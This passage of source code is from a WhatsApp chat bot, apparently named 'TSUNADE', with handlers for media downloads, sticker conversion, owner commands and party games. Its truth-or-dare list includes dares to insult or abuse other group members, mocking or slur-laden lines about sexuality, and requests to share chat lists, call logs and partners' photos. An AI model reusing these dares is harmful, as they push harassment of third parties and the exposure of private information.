                   dataa = dataa.includes('shorts') ? dataa.replace('https://youtube.com/shorts/', 'https://youtu.be/') : dataa
                   yta(dataa).then(async(data) => {
                     var teks = `🧚‍♂️ *TSUNADE YT PLAY* 🧚‍♂️\n\n*➢ Title :* ${data.title}\n*➢ Quality :* 128p\n*➢ Size :* ${data.filesizeF}\n*➢ Source :* ${q}\n\n_Please wait a while..._`
                     if (Number(data.filesize) >= 2000000) {
                       var res = await axios.get(`https://tinyurl.com/api-create.php?url=${data.dl_link}`)
                       teks = `🧚‍♂️ *TSUNADE YT PLAY* 🧚‍♂️\n\n*➢ Title :* ${data.title}\n*➢ Quality :* 128p\n*➢ Size :* ${data.filesizeF}\n*➢ Source :* ${q}\n*➢ Download :* ${res.data}\n\n_This file is too large, Please download it from above url._`
                       TsunadeBot.sendMessage(from, { image: { url: data.thumb }, caption: teks }, { quoted: m })
                     } else {
                       TsunadeBot.sendMessage(from, { image: { url: data.thumb }, caption: teks }, { quoted: m })
                       TsunadeBot.sendMessage(from, { document: { url: data.dl_link.replace("https://", "http://")}, fileName: `${data.title}.mp3`, mimetype: 'audio/mp3'}, { quoted: m })
                       }
                   }).catch(() => replygcmznking(`*An error occurred while processing your request.*`))
                   break
case "ytmp3": case "ytaudio": 
const mznkingaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !mznkingaudp3.isYTUrl(text)) return replygcmznking(`*Please enter a YouTube link for download audio from YouTube.\nFor example: ${prefix + command} https://youtu.be/ABCDEF123`)
const audio=await mznkingaudp3.mp3(text)
await TsunadeBot.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const mznkingvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !mznkingvidoh.isYTUrl(text)) replygcmznking(`*Please enter a YouTube link for download video from YouTube.\nFor example: ${prefix + command} https://youtu.be/ABCDEF123 128kbps`)
const vid=await mznkingvidoh.mp4(text)
const ytc=`
📜*Title:* ${vid.title}
📅 *Date:* ${vid.date}
⏱️ *Duration:* ${vid.duration}
🌟 *Quality:* ${vid.quality}`
await TsunadeBot.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcmznking('*Please enter a YouTube link for download video from YouTube.*')
await MznKingWaitReply()
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcmznking('*Please enter a YouTube link for download audio from YouTube.*')
await MznKingWaitReply()
downloadMp3(text)
}
break  
case 'getcase':
if (!MznKingTheCreator) return MznKingOwnerReply()
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("TsunadeOld.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcmznking(`${getCase(q)}`)
break
case 'addowner':
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!args[0]) return replygcmznking(`*Please enter the number of add bot owner.*\nFor example ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await TsunadeBot.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcmznking(`*Please enter a valid WhatsApp number.*`)
owner.push(bnnd)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
replygcmznking(`*${bnnd} has been added as a owner.*`)
break
case 'delowner':
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!args[0]) return replygcmznking(`*Please enter the number of delete bot owner.*\nFor example ${prefix+command} ${ownernumber}`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
replygcmznking(`*${ya} has been deleted from owner list.*`)
break
case 'setcmd': {
                if (!m.quoted) return replygcmznking('Reply Message!')
                if (!m.quoted.fileSha256) return replygcmznking('SHA256 Hash Missing')
                if (!text) return replygcmznking(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcmznking('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcmznking(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcmznking(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcmznking('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcmznking(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                TsunadeBot.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!MznKingTheCreator) return MznKingOwnerReply()
                if (!m.quoted) return replygcmznking('Reply Message!')
                if (!m.quoted.fileSha256) return replygcmznking('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcmznking('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcmznking('Done!')
            }
            break
case 'setexif': {
               if (!MznKingTheCreator) return MznKingOwnerReply()
               if (!text) return replygcmznking(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcmznking(`Exif has been successfully changed to\n\n🧚 Packname : ${global.packname}\n🧚 Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await TsunadeBot.fetchStatus(who)
    replygcmznking(bio.status)
  } catch {
    if (text) return replygcmznking(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await TsunadeBot.fetchStatus(who)
      replygcmznking(bio.status)
    } catch {
      return replygcmznking(`*Please reply to the message of person.*`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!quoted) return replygcmznking(`*Please reply to image or send with command in caption.*\n${prefix + command}`)
if (!/image/.test(mime)) return replygcmznking(`*Please reply to image or send with command in caption.*\n${prefix + command}`)
if (/webp/.test(mime)) return replygcmznking(`*Please reply to image or send with command in caption.*\n${prefix + command}`)
var medis = await TsunadeBot.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await TsunadeBot.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcmznking(`Success`)
} else {
var memeg = await TsunadeBot.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcmznking(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!MznKingTheCreator) return MznKingOwnerReply()
if (!args.join(" ")) return replygcmznking(`Use ${prefix+command} groupname`)
try {
let cret = await TsunadeBot.groupCreate(args.join(" "), [])
let response = await TsunadeBot.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz(timezone).format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
TsunadeBot.sendMessage(m.chat, { text:teks, mentions: await TsunadeBot.parseMention(teks)}, {quoted:m})
} catch {
replygcmznking("${errorReply}")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
TsunadeBot.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
TsunadeBot.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcmznking('Reply to Sticker')
                if (!/webp/.test(mime)) return replygcmznking(`reply sticker with caption *${prefix + command}*`)
                await MznKingWaitReply()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await TsunadeBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcmznking(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcmznking(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            await MznKingWaitReply()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            TsunadeBot.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcmznking(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcmznking(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return replygcmznking(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            await MznKingWaitReply()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            TsunadeBot.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${TsunadeBot.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcmznking(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcmznking(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            await MznKingWaitReply()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            TsunadeBot.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcmznking('Reply video')
                if (!/webp/.test(mime)) return replygcmznking(`reply sticker with caption *${prefix + command}*`)
                await MznKingWaitReply()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await TsunadeBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcmznking('*Please provide a text or link.*')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await TsunadeBot.sendMessage(from, { image: medi, caption:"*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner mznking through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const mznkingdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              TsunadeBot.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ mznkingdare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, mznking?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const mznkingtruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              TsunadeBot.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ mznkingtruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
TsunadeBot.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	await MznKingWaitReply()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replygcmznking(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await TsunadeBot.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            TsunadeBot.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replygcmznking(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcmznking(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
TsunadeBot.downloadAndSaveMediaMessage(quoted, "gifee")
TsunadeBot.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await TsunadeBot.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcmznking('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await TsunadeBot.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcmznking(`Photo/Video?`)
}
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcmznking(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await TsunadeBot.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await TsunadeBot.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      TsunadeBot.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcmznking('${errorReply}')
    }
    }
    break
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcmznking(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await TsunadeBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcmznking('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await TsunadeBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replygcmznking(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'quotes':
const quotemznkingz = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*🧚 Quote:* ${quotemznkingz.data.quote.body}\n\n*🧚 Author:* ${quotemznkingz.data.quote.author}`
return replygcmznking(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcmznking(`*Please tag someone.*\nFor example: ${prefix + command} @WhatsApp`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
TsunadeBot.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcmznking(`*Please tag someone.*\nFor example: ${prefix + command} @WhatsApp`)
